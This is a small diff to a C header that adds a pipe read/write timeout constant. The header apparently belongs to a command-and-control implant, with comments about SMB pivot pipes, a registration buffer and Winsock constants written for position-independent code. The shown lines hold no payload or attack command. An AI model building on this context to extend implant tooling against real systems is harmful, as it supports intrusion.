@@ -16,6 +16,7 @@
 #define NAX_REG_BODY_BUF        1200                    /* registration body stack buffer       */
 #define NAX_PIPE_CHUNK_SIZE     0x2000u                 /* 8 KB - pipe write chunk (Smb + Pivot) */
 #define NAX_PIPE_BUF_SIZE       0x10000u                /* 64 KB - CreateNamedPipeA buffer size */
+#define NAX_PIPE_IO_TIMEOUT_MS  5000u                   /* 5 s - pipe read/write timeout         */
 
 /* ========= [ Winsock SDK constants (PIC: not from headers) ] ========= */
 
